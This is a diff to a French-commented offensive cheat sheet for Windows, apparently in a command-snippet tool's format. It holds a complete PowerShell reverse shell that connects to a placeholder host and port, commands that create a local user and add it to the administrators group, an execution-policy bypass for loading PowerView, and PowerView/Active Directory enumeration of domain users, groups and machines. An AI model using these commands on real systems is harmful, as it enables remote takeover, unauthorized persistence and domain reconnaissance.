@@ -38,10 +38,13 @@ $ TYPE: echo "all,copy,view,exec" | tr ',' '\n'
 # Reverse shell powershell
 run <TYPE> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
+# Charger powershell avec Policy Execution bypass (Permet d'exécuter le script PowerView.ps1)
+run <TYPE> powershell -ep bypass
+
 $ TYPE: echo "all,copy,view,exec" | tr ',' '\n'
 
 
-% windows, add, user, group
+% windows, add, user, group, computer
 
 # Ajouter un nouvel utilisateur à windows
 run <TYPE> net user <USERNAME> <PASSWORD> /add
@@ -49,4 +52,17 @@ run <TYPE> net user <USERNAME> <PASSWORD> /add
 # Ajouter l'utilisateur au groupe admin
 run <TYPE> net localgroup administrators <USERNAME> /add
 
+# Lister les utilisateurs du domaine
+run <TYPE> powershell -c "Get-NetUser | select cn"
+
+# Lister tous les groupes
+run <TYPE> powershell -c "Get-NetGroup"
+
+# Lister les os du domaine
+run <TYPE> powershell -c "Get-NetComputer -fulldata | select operatingsystem"
+
+# Afficher toutes les propriétés d'un utilisateur
+run <TYPE> powershell -c "Get-ADUser -Identity <USER> -Properties *"
+
+$ USER: echo "Administrateur,Administrator" | tr ',' '\n'
 $ TYPE: echo "all,copy,view,exec" | tr ',' '\n'
